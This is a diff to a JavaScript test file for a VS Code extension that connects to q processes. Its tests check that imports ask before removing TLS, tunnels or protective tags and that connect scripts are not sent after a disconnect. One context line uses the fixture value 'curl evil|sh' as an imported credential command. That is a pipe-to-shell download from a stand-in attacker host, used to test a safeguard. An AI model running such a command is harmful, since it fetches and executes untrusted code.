@@ -90,7 +90,7 @@ async function setUp(t, processes) {
   t.after(() => {
     for (const d of context.subscriptions) d.dispose?.();
   });
-  return { live, run: (...args) => stub.commands.get(CONNECT_SCRIPT_COMMANDS.set)(...args) };
+  return { live, context, run: (...args) => stub.commands.get(CONNECT_SCRIPT_COMMANDS.set)(...args) };
 }
 
 test("Set Connect Script asks for code, a file or none, and keeps it on the process", async (t) => {
@@ -168,6 +168,31 @@ test("Import asks before taking a credential command, and drops it on without (#
   assert.deepStrictEqual(live.processes().map((p) => [p.credentialCommand, p.ssh, p.launch]), [["curl evil|sh", undefined, undefined], [undefined, "jump", { command: "q" }]]);
 });
 
+test("Import asks before taking away TLS, a tunnel or a guarded tag, and forgets a password it reroutes (#1269)", async (t) => {
+  const { live, context } = await setUp(t, [proc("a", { tls: true, ssh: "jump", tags: ["prod"] }), proc("b")]);
+  context.secrets.all.set("q-lint.password.a", "pw");
+  const vscode = require("vscode");
+  const fs = vscode.workspace.fs;
+  vscode.workspace.fs = { readFile: async () => Buffer.from(JSON.stringify([proc("a"), proc("b", { tags: ["x"] })])) };
+  t.after(() => (vscode.workspace.fs = fs));
+  let asked;
+  stub.picks.push(({ message, items }) => ((asked = [message, items.slice(1)]), "Keep Them"));
+  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
+  assert.match(asked[0], /takes from 1 process\(es\) what protects them.*: a \(TLS, SSH tunnel, tag prod\)\. Keep them\?/);
+  assert.deepStrictEqual(asked[1], ["Keep Them", "Import as Written"]);
+  assert.deepStrictEqual(live.processes(), [proc("a", { tls: true, ssh: "jump", tags: ["prod"] }), proc("b", { tags: ["x"] })]);
+  assert.strictEqual(context.secrets.all.get("q-lint.password.a"), "pw");
+  // Escape imports nothing; as written takes them away, and the password
+  // given for TLS through the tunnel is not sent in the clear.
+  stub.picks.push(undefined);
+  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
+  assert.strictEqual(live.processes()[0].tls, true);
+  stub.picks.push("Import as Written");
+  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
+  assert.deepStrictEqual(live.processes()[0], proc("a"));
+  assert.strictEqual(context.secrets.all.has("q-lint.password.a"), false);
+});
+
 test("with q-lint.connection.connectScript.enable off, Set Connect Script refuses and no script is sent", async (t) => {
   const net = require("node:net");
   const messages = [];
@@ -194,4 +219,39 @@ test("with q-lint.connection.connectScript.enable off, Set Connect Script refuse
   assert.strictEqual(await live.connectTo("s"), true);
   await new Promise((r) => setTimeout(r, 100));
   assert.deepStrictEqual(messages, [], "nothing was sent on connect");
+});
+
+// The guard's question about a connect script can be open for as long as
+// the user likes; a disconnect meanwhile gave the connect up, and "Run
+// Anyway" after it still sent the script (#1357).
+test("a connect script is not sent once the connect was given up while the read-only guard asked", async (t) => {
+  const { fakeQ } = require("./fakeq.js");
+  const q = await fakeQ(null);
+  t.after(() => q.close());
+  const { live } = await setUp(t, [{ label: "p", host: "127.0.0.1", port: q.port, tags: ["prod"], init: "secretTable:([]a:1 2)" }]);
+  t.after(() => stub.commands.get("q-lint.disconnectProcess")?.());
+  const scripts = () => q.sent.filter((m) => JSON.stringify(m).includes("secretTable")).length;
+  // Answers the guard's question only: a message from a test before this
+  // one (its connection closing) leaves the answer for the question.
+  const answer = (disconnectFirst) => {
+    const pick = async ({ message }) => {
+      if (!/connect script of p/i.test(message)) {
+        stub.picks.unshift(pick);
+        return undefined;
+      }
+      if (disconnectFirst) {
+        await stub.commands.get("q-lint.disconnectProcess")();
+      }
+      return "Run Anyway";
+    };
+    stub.picks.push(pick);
+  };
+  answer(true);
+  assert.strictEqual(await live.connectTo("p"), false);
+  await new Promise((r) => setTimeout(r, 100));
+  assert.strictEqual(scripts(), 0, "nothing was sent to a process the user disconnected from");
+  // Left to finish, the same answer sends it.
+  answer(false);
+  assert.strictEqual(await live.connectTo("p"), true);
+  assert.strictEqual(scripts(), 1);
 });
